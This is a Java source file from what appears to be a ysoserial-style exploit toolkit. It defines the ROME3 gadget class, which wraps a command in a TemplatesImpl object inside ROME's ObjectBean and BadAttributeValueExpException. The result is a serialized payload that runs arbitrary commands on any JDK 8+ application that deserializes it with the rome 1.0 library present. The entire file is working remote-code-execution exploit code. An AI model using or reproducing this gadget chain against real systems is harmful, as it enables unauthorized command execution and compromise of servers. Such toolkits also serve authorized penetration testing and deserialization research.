package A.R.ysogate.payloads.gadgets;


import com.sun.syndication.feed.impl.ObjectBean;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;


/**
 * JDK 8+
 */
@Dependencies("rome:rome:1.0")
@Authors({"Firebasky"})
public class ROME3 implements ObjectPayload<Object> {

	public Object getObject(String command) throws Exception {
		Object                        o        = Gadgets.createTemplatesImpl(command);
		ObjectBean                    delegate = new ObjectBean(Templates.class, o);
		BadAttributeValueExpException b        = new BadAttributeValueExpException("");
		Reflections.setFieldValue(b, "val", delegate);
		return b;
	}
}
